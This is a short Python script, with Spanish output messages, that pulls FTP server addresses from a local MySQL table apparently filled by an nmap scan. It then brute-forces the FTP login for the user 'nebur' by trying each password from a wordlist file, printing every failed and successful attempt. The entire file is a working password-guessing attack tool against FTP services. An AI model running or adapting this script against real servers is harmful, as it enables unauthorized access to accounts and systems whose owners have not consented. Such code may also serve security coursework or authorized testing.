from ftplib import FTP

import os
import mysql.connector as mysql

conexion = mysql.connect(host='localhost', user= 'root', passwd='', db='nmap')
    
operacion = conexion.cursor()
operacion.execute( "SELECT direccion from puerto WHERE servicio = 'ftp';")
for direccion in operacion.fetchall() :
    print (direccion)
conexion.close()
host = str(direccion[0])
print(host)

user = "nebur"

f = open("2151220-passwords.txt","r")
rawPasswords = ""
for line in f.readlines(): 
    rawPasswords += line
f.close()
passwords = rawPasswords.split('\n')

for i in range(len(passwords)-1):
    try:
        conexion = FTP(host)
        conexion.login(user, str(passwords[i]))
        print("\nSe estableció la conexión mediante la contraseña (" + str(passwords[i]) + ")\n")
        break
    except:
        print("\nFalló la conexión con la contraseña ("+ str(passwords[i])+")\n")